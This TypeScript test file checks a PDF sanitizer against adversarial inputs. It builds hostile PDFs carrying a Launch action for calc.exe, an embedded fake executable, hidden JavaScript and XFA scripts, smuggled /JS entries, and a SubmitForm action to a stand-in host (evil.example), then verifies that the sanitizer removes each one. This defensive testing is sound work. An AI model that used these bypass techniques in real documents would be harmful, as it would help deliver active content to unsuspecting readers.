import { expect } from 'chai';
import { PdfCategory as C, PdfDetail as D, inspectPdf } from '../../src';
import { LINK, makeDoc } from '../helpers/builder';
import { pdfjsText } from '../helpers/pdfjs';
import { has, must } from '../helpers/util';
import { pdfjsScripts, qpdfDump, run } from './helpers';

// Each test asserts the behavior the design asks for. A failing test is a bypass.
describe('adversarial: walker rules', () => {
  it('removes a Launch action that is first reached through an unknown catalog key and then used as a link action', async () => {
    // The action carries /P, so looksLikeAction() says no and the generic visit keeps it. The link's /A then finds it visited.
    const { pdf } = makeDoc({
      catalog: '/Foo 6 0 R',
      objects: ['<< /S /Launch /F (calc.exe) /P 3 0 R >>'],
      annots: [LINK('6 0 R')],
    });
    const { r, out, bytes } = await run(pdf);
    expect({
      status: r.status,
      reported: has(r.before, C.Action, D.Launch),
      survives: must(out, 'output scan').actions.includes('Launch'),
      qpdfSees: /\/S \/Launch/.test(qpdfDump(must(bytes, 'output bytes'))),
    }).to.deep.equal({ status: 'defused', reported: true, survives: false, qpdfSees: false });
  });

  it('applies the annotation allowlist and file rules to annotations that are also listed in /AcroForm /Fields', async () => {
    // Listed as a field, inferRole() returns 'field' for any non-Widget subtype, so handleField() runs instead of
    // handleAnnot(): no subtype allowlist, and /FS is walked as a generic value. The embedded file stream has no
    // /Type, which the spec allows, so the generic walk keeps it too. The page's /Annots then finds both visited.
    const media = makeDoc({
      catalog: '/AcroForm << /Fields [6 0 R] >>',
      annots: ['<< /Type /Annot /Subtype /RichMedia /Rect [0 0 300 300] /RichMediaContent << /Assets << /Names [] >> /Configurations [] >> >>'],
    }).pdf;
    const attach = makeDoc({
      catalog: '/AcroForm << /Fields [7 0 R] >>',
      objects: [{ dict: '<< /Subtype /application#2Fx-msdownload /Params << /Size 12 >> >>', stream: 'MZ\x90\x00 fake exe', deflate: true }],
      annots: ['<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 20 20] /FS << /Type /Filespec /F (a.exe) /UF (a.exe) /EF << /F 6 0 R >> >> >>'],
    }).pdf;
    const m = await run(media);
    const a = await run(attach);
    expect({
      richMedia: {
        status: m.r.status,
        reported: has(m.r.before, C.Media, D.RichMedia),
        annotSurvives: must(m.out, 'output scan').names.has('RichMedia'),
        qpdfSees: /\/Subtype \/RichMedia/.test(qpdfDump(must(m.bytes, 'output bytes'))),
      },
      fileAttachment: {
        status: a.r.status,
        reported: has(a.r.before, C.EmbeddedFile, D.NoPlugin),
        annotSurvives: must(a.out, 'output scan').names.has('FileAttachment'),
        efSurvives: must(a.out, 'output scan').keys.has('EF'),
        qpdfSeesFileBytes: qpdfDump(must(a.bytes, 'output bytes')).includes('fake exe'),
      },
    }).to.deep.equal({
      richMedia: { status: 'defused', reported: true, annotSurvives: false, qpdfSees: false },
      fileAttachment: { status: 'defused', reported: true, annotSurvives: false, efSurvives: false, qpdfSeesFileBytes: false },
    });
  });

  it('removes an annotation without /Type whose subtype is Screen when the structure tree reaches it first', async () => {
    // /Type is optional for annotations. Reached first through an OBJR, inferRole() falls back to 'generic'.
    const { pdf } = makeDoc({
      catalog: '/StructTreeRoot << /Type /StructTreeRoot /K << /Type /StructElem /S /Figure /K << /Type /OBJR /Obj 6 0 R >> >> >>',
      annots: ['<< /Subtype /Screen /Rect [0 0 300 300] /P 3 0 R /MK << >> >>'],
    });
    const { r, out, bytes } = await run(pdf);
    expect({
      status: r.status,
      reported: has(r.before, C.Media, D.Screen),
      survives: must(out, 'output scan').names.has('Screen'),
      qpdfSees: /\/Subtype \/Screen/.test(qpdfDump(must(bytes, 'output bytes'))),
    }).to.deep.equal({ status: 'defused', reported: true, survives: false, qpdfSees: false });
  });

  it('flags a full-page link that a tagged structure tree references before the page does', async () => {
    // Typed /Annot, so handleAnnot runs, but from the structure-tree context with no page box: the coverage check is skipped.
    const { pdf } = makeDoc({
      catalog: '/StructTreeRoot << /Type /StructTreeRoot /K << /Type /StructElem /S /Link /K << /Type /OBJR /Obj 6 0 R >> >> >>',
      annots: [LINK('<< /S /URI /URI (https://example.com/) >>', '[0 0 612 792]')],
    });
    const { r, out } = await run(pdf);
    expect({
      status: r.status,
      reported: has(r.before, C.Link, D.FullPage),
      linkActionSurvives: must(out, 'output scan').actions.includes('URI'),
    }).to.deep.equal({ status: 'defused', reported: true, linkActionSurvives: false });
  });

  it('removes XFA from an AcroForm dictionary that a JavaScript-tree navigation action reaches first', async () => {
    // prepassDocumentScripts() runs before the catalog. A kept GoTo in the tree enqueues 6 as generic, ahead of the catalog.
    const { pdf } = makeDoc({
      catalog: '/Names << /JavaScript << /Names [(nav) << /S /GoTo /D [3 0 R /Fit] /Foo 6 0 R >>] >> >> /AcroForm 6 0 R',
      objects: [
        '<< /Fields [] /XFA 7 0 R >>',
        { dict: '<< >>', stream: '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><script contentType="application/x-javascript">app.alert(1)</script></template></xdp:xdp>' },
      ],
    });
    const { r, out, bytes } = await run(pdf);
    expect({
      status: r.status,
      reported: has(r.before, C.Form, D.Xfa),
      xfaSurvives: must(out, 'output scan').keys.has('XFA'),
      jsTreeSurvives: must(out, 'output scan').keys.has('JavaScript'),
      qpdfSeesXfaScript: qpdfDump(must(bytes, 'output bytes')).includes('app.alert(1)'),
    }).to.deep.equal({ status: 'defused', reported: true, xfaSurvives: false, jsTreeSurvives: false, qpdfSeesXfaScript: false });
  });

  it('finds document JavaScript whose name-tree key is a name or an indirect string', async () => {
    // collectNameTree() skips any pair whose key is not a direct PdfString. pdf.js NameTree.getAll() accepts both forms.
    const byName = makeDoc({ catalog: '/Names << /JavaScript << /Names [/init << /S /JavaScript /JS (app.alert\\(1\\)) >>] >> >>' }).pdf;
    const byRef = makeDoc({ catalog: '/Names << /JavaScript << /Names [6 0 R << /S /JavaScript /JS (app.alert\\(2\\)) >>] >> >>', objects: ['(init)'], info: '<< /Title 6 0 R >>' }).pdf;
    const seen: Record<string, unknown> = {};
    for (const [label, pdf] of [
      ['name key', byName],
      ['indirect key', byRef],
    ] as const) {
      const { r, out, bytes } = await run(pdf);
      seen[label] = {
        status: r.status,
        reported: has(r.before, C.JavaScript, D.Document),
        jsSurvives: must(out, 'output scan').keys.has('JS'),
        pdfjsRunsFromInput: (await pdfjsScripts(pdf)).document,
        pdfjsRunsFromOutput: (await pdfjsScripts(must(bytes, 'output bytes'))).document,
      };
    }
    const good = { status: 'defused', reported: true, jsSurvives: false, pdfjsRunsFromInput: true, pdfjsRunsFromOutput: false };
    expect(seen).to.deep.equal({ 'name key': good, 'indirect key': good });
  });

  it('finds document JavaScript in a name tree nested deeper than 64 levels', async () => {
    // collectNameTree() stops at depth 64 without a finding. All nodes are direct, so nothing counts as unreferenced.
    let node = '<< /Names [(deep) << /S /JavaScript /JS (app.alert\\(1\\)) >>] >>';
    for (let i = 0; i < 70; i++) node = `<< /Kids [${node}] >>`;
    const { pdf } = makeDoc({ catalog: `/Names << /JavaScript ${node} >>` });
    const { r, out, bytes } = await run(pdf);
    expect({
      status: r.status,
      reported: has(r.before, C.JavaScript, D.Document),
      jsSurvives: must(out, 'output scan').keys.has('JS'),
      pdfjsRunsFromInput: (await pdfjsScripts(pdf)).document,
      pdfjsRunsFromOutput: (await pdfjsScripts(must(bytes, 'output bytes'))).document,
    }).to.deep.equal({ status: 'defused', reported: true, jsSurvives: false, pdfjsRunsFromInput: true, pdfjsRunsFromOutput: false });
  });

  it('removes a /JS entry carried by a kept navigation action, including a duplicate-/S dictionary', async () => {
    // handleAction() copies a non-reference JS value through for any kept action type.
    const plain = makeDoc({ annots: [LINK('<< /S /GoTo /D [3 0 R /Fit] /JS (app.alert\\(1\\)) >>')] }).pdf;
    // First-wins readers see a JavaScript action here; this parser keeps the last /S.
    const dup = makeDoc({ annots: [LINK('<< /S /JavaScript /JS (app.alert\\(1\\)) /S /GoTo /D [3 0 R /Fit] >>')] }).pdf;
    const seen: Record<string, unknown> = {};
    for (const [label, pdf] of [
      ['plain', plain],
      ['duplicate /S', dup],
    ] as const) {
      const { r, out } = await run(pdf);
      seen[label] = { status: r.status, reported: r.before.findings.some(f => f.category === C.JavaScript), jsSurvives: must(out, 'output scan').keys.has('JS') };
    }
    const good = { status: 'defused', reported: true, jsSurvives: false };
    expect(seen).to.deep.equal({ plain: good, 'duplicate /S': good });
  });

  it('keeps every content stream of a page when one of them is also named as a link action', async () => {
    // The link's /A is decided immediately, as an action, before the page's /Contents entry is visited.
    const { pdf } = makeDoc({
      page: '',
      content: 'BT /F1 24 Tf 72 720 Td (Hello) Tj ET',
      objects: [{ dict: '<< >>', stream: 'BT /F1 24 Tf 72 600 Td (World) Tj ET', deflate: true }],
      annots: [LINK('6 0 R')],
    });
    // Put the second stream into the page's Contents after the Annots key.
    const text = pdf.toString('latin1').replace('/Contents 5 0 R /Annots [7 0 R]', '/Annots [7 0 R] /Contents [5 0 R 6 0 R]');
    const fixed = Buffer.from(text, 'latin1');
    const inputView = await pdfjsText(fixed);
    expect(inputView.text).to.include('World');
    const { r, bytes } = await run(fixed);
    expect(r.status).to.not.equal('rejected');
    const outputView = await pdfjsText(must(bytes, 'output bytes'));
    expect(outputView.text, `status ${r.status}`).to.equal(inputView.text);
  });

  it('removes JavaScript in additional actions on structure elements, XObjects and hex-escaped keys', async () => {
    const { pdf } = makeDoc({
      catalog: '/StructTreeRoot << /Type /StructTreeRoot /K << /Type /StructElem /S /P /AA << /O << /S /JavaScript /JS (a) >> >> >> >>',
      page: '/#41A << /O << /#53 /Java#53cript /J#53 (b) >> >> /Resources << /Font << /F1 4 0 R >> /XObject << /X1 6 0 R >> >>',
      objects: [{ dict: '<< /Type /XObject /Subtype /Form /BBox [0 0 1 1] /AA << /PO << /S /JavaScript /JS (c) >> >> >>', stream: '' }],
      annots: ['<< /Type /Annot /Subtype /Text /Rect [0 0 1 1] /A#41 << /E << /S /SubmitForm /F (https://evil.example/) >> >> >>'],
    });
    const insp = await inspectPdf(pdf);
    expect(insp.findings.filter(f => f.category === C.JavaScript).length).to.be.greaterThan(1);
    const { out } = await run(pdf);
    expect(must(out, 'output scan').keys.has('JS')).to.equal(false);
    expect(must(out, 'output scan').actions).to.not.include('JavaScript');
    expect(must(out, 'output scan').actions).to.not.include('SubmitForm');
  });

  it('walks a /Next cycle and a 3000-long indirect /Next chain without crashing and removes every script', async () => {
    const objects: string[] = [];
    const n = 3000;
    // 6 .. 6+n-1 form a chain; the last one points back to 6.
    for (let i = 0; i < n; i++) objects.push(`<< /S ${i % 2 ? `/JavaScript /JS (s${i})` : '/GoTo /D [3 0 R /Fit]'} /Next ${6 + ((i + 1) % n)} 0 R >>`);
    const { pdf } = makeDoc({ catalog: '/OpenAction 6 0 R', objects });
    const { r, out } = await run(pdf);
    expect(r.status).to.not.equal('rejected');
    expect(must(out, 'output scan').keys.has('JS')).to.equal(false);
    expect(must(out, 'output scan').actions).to.not.include('JavaScript');
  });

  it('removes scripts on a widget merged with its field, on an annotation reached through /Popup and /Annots, and on a field with no widget', async () => {
    const { pdf } = makeDoc({
      catalog: '/AcroForm << /Fields [6 0 R 8 0 R] >>',
      objects: [
        '<< /Type /Annot /Subtype /Widget /FT /Tx /T (merged) /Rect [10 10 100 30] /AA << /K << /S /JavaScript /JS (k) >> >> /A << /S /JavaScript /JS (a) >> >>',
        '<< /Type /Annot /Subtype /Popup /Rect [0 0 1 1] /Parent 9 0 R /AA << /E << /S /JavaScript /JS (p) >> >> >>',
        '<< /FT /Tx /T (hidden) /AA << /C << /S /JavaScript /JS (calc) >> /V << /S /ImportData /F (x.fdf) >> >> >>',
      ],
      annots: ['<< /Type /Annot /Subtype /Text /Rect [0 0 1 1] /Popup 7 0 R >>'],
    });
    // Also list the merged widget (6) and the popup (7) directly in the page's /Annots.
    const text = pdf.toString('latin1');
    expect(text).to.include('/Annots [9 0 R]');
    const fixed = Buffer.from(text.replace('/Annots [9 0 R]', '/Annots [9 0 R 6 0 R 7 0 R]'), 'latin1');
    // pdf.js runs the merged widget's triggers.
    expect((await pdfjsScripts(fixed)).annotations).to.equal(1);
    const { out, bytes } = await run(fixed);
    expect(await pdfjsScripts(must(bytes, 'output bytes'))).to.deep.equal({ document: false, annotations: 0 });
    expect(must(out, 'output scan').keys.has('JS')).to.equal(false);
    expect(must(out, 'output scan').actions).to.not.include('JavaScript');
    expect(must(out, 'output scan').actions).to.not.include('ImportData');
  });
});
